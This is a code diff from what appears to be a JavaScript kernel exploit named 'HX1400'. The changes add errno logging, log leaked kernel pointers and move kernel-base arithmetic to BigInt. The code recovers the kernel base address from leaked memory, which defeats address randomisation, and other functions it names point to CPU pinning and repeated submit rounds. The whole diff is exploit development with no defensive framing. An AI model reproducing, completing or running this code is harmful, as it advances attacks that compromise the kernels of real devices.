@@ -305,6 +305,7 @@ function pinCpu() {
     throw new Error(
       "pin-read-mask failed rv=" +
       getRv +
+      " errno=" + c.errno() +
       " cores=" +
       cores.length,
     );
@@ -492,7 +493,7 @@ function wash(set, rounds) {
 
     if (submitRv !== 0) {
       failAt = iter;
-      failOp = "submit";
+      failOp = "submit errno=" + c.errno();
       rc = submitRv;
       break;
     }
@@ -585,10 +586,12 @@ function wash(set, rounds) {
 }
 
 
+let leakCount = 0;
+
 function parseKbase(buffer, length) {
   let offset = 0;
   let hits = 0;
-  let base = 0;
+  let base = 0n;
   let conflict = false;
 
   if (length > buffer.ab.byteLength) {
@@ -620,26 +623,29 @@ function parseKbase(buffer, length) {
         offset + 36,
       );
 
-      const qword =
-        high * 0x100000000 +
-        low;
-
       if (
         high === 0xffffffff &&
         low !== 0 &&
         low !== 0xffffffff
       ) {
-        const candidate =
-          qword - P[12];
+        const qword =
+          (BigInt(high >>> 0) << 32n) |
+          BigInt(low >>> 0);
 
-        const candidateHigh =
-          Math.floor(
-            candidate / 0x100000000,
-          ) >>> 0;
+        if (leakCount < 8) {
+          log(
+            "HX1400-LEAK",
+            "q" + leakCount + "=0x" +
+            qword.toString(16).padStart(16, "0"),
+          );
+          leakCount++;
+        }
+
+        const candidate = qword - BigInt(P[12]);
 
         if (
-          (candidate & 0x3fff) === 0 &&
-          candidateHigh === 0xffffffff
+          (candidate & 0x3fffn) === 0n &&
+          (candidate >> 32n) === 0xffffffffn
         ) {
           if (hits === 0) {
             base = candidate;
@@ -659,7 +665,7 @@ function parseKbase(buffer, length) {
     return base;
   }
 
-  return 0;
+  return 0n;
 }
 
 
@@ -805,7 +811,7 @@ async function discoverKbase() {
       " kbase=" +
       (
         kbase
-          ? h16(kbase)
+          ? "0x" + kbase.toString(16).padStart(16, "0")
           : "none"
       ),
     );
@@ -819,7 +825,7 @@ async function discoverKbase() {
 
   restorePin();
 
-  return 0;
+  return 0n;
 }
 
 
@@ -854,7 +860,7 @@ export async function runHx1400(ctx) {
 
     log(
       "HX1400-KBASE",
-      h16(kbase),
+      "0x" + kbase.toString(16).padStart(16, "0"),
     );
 
     log(
